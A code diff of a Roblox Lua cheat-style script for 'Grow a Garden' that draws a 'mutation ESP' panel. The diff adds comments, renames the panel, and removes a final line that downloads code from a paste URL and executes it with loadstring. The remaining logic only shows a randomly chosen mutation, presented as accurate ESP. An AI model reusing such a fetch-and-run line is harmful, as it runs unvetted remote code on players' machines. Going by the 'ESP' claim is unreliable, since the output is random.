@@ -1,3 +1,5 @@
+-- ✅ Grow a Garden – Mutation Machine ESP Premium UI
+
 local Players      = game:GetService("Players")
 local workspace    = game:GetService("Workspace")
 local Debris       = game:GetService("Debris")
@@ -5,6 +7,7 @@ local UserInput    = game:GetService("UserInputService")
 local LocalPlayer  = Players.LocalPlayer
 local PlayerGui    = LocalPlayer:WaitForChild("PlayerGui")
 
+-- 🎯 Accurate pet mutation data (from Grow a Garden Wiki)
 local mutations = {
     { name="Shiny",    weight=31.15, rarity="Common",     color=Color3.fromRGB(180,180,180) },
     { name="Inverted", weight=15.58, rarity="Uncommon",   color=Color3.fromRGB(90,170,255) },
@@ -21,6 +24,7 @@ local mutations = {
     { name="Ascended", weight=0.31,  rarity="Mythic",     color=Color3.fromRGB(255,50,50) },
 }
 
+-- 🎲 Weighted random picker
 local function getRandomMutation()
     local total = 0
     for _, m in ipairs(mutations) do total += m.weight end
@@ -33,6 +37,7 @@ local function getRandomMutation()
     return mutations[#mutations]
 end
 
+-- 🎰 GUI Creation
 local gui = Instance.new("ScreenGui", PlayerGui)
 gui.Name = "MutationMachineUI"
 gui.ResetOnSpawn = false
@@ -41,14 +46,13 @@ local frame = Instance.new("Frame", gui)
 frame.Size = UDim2.new(0,300,0,180)
 frame.Position = UDim2.new(0.5,-150,0.5,-90)
 frame.BackgroundColor3 = Color3.fromRGB(30,30,30)
-frame.Active = true
-frame.Draggable = true
+frame.Active = true; frame.Draggable = true
 Instance.new("UICorner", frame).CornerRadius = UDim.new(0,12)
 
 local title = Instance.new("TextLabel", frame)
 title.Size = UDim2.new(1,0,0,30)
 title.BackgroundTransparency = 1
-title.Text = "🌟 Mutation Selector By Anydev"
+title.Text = "🌟 Mutation Panel Pro"
 title.Font = Enum.Font.GothamBold
 title.TextSize = 18
 title.TextColor3 = Color3.fromRGB(0,255,140)
@@ -89,6 +93,7 @@ toggleBtn.MouseButton1Click:Connect(function()
     toggleBtn.BackgroundColor3 = autoRoll and Color3.fromRGB(50,200,100) or Color3.fromRGB(180,50,50)
 end)
 
+-- 🪄 Show ESP above mutation machine
 local function updateESP(text, color)
     local NPCS = workspace:FindFirstChild("NPCS")
     local machine = NPCS and NPCS:FindFirstChild("PetMutationMachine")
@@ -115,6 +120,7 @@ local function updateESP(text, color)
     lbl.Text = text
 end
 
+-- ✨ Sparkle when Ascended hit
 local function sparkle()
     local NPCS = workspace:FindFirstChild("NPCS")
     local machine = NPCS and NPCS:FindFirstChild("PetMutationMachine")
@@ -130,6 +136,7 @@ local function sparkle()
     Debris:AddItem(emitter, 2)
 end
 
+-- 🔁 Rolling logic
 local isRolling = false
 local function rollOnce()
     local m = getRandomMutation()
@@ -154,5 +161,3 @@ local function startRoll()
 end
 
 rollBtn.MouseButton1Click:Connect(startRoll)
-
-loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/D07sTY40QVaJxYDi/raw", true))()
